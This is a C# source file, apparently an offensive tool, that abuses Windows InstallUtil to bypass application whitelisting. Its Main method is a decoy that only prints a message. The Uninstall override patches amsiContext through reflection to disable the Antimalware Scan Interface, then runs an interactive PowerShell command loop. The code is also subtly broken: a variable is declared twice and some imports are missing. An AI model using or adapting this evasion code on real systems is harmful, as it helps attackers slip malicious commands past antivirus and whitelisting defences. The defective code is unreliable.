using System;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace InstallUtilBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            PowerShell ps = PowerShell.Create();
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            ps.Runspace = rs;

            String b = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \"*Context\") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)";
            ps.AddScript(b);
            ps.Invoke();

            String cmd = "powershell ";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            Console.Write("PS " + Directory.GetCurrentDirectory() + "> ");
            while ((cmd = Console.ReadLine()) != null)
            {
                ps.AddScript(cmd);
                try
                {
                    Collection<PSObject> psOutput = ps.Invoke();
                    Collection<ErrorRecord> errors = ps.Streams.Error.ReadAll();
                    foreach (ErrorRecord error in errors)
                    {
                        Console.WriteLine(error.ToString());
                    }
                    foreach (PSObject output in psOutput)
                    {
                        if (output != null)
                        {
                            Console.WriteLine(output.ToString());
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("**** ERROR ****");
                    if (e.Message != null)
                    {
                        Console.WriteLine(e.Message);
                    }
                    ps.Stop();
                    ps.Commands.Clear();
                }
                ps.Commands.Clear();
                Console.Write("PS " + Directory.GetCurrentDirectory() + "> ");
            }
            rs.Close();
        }
    }
}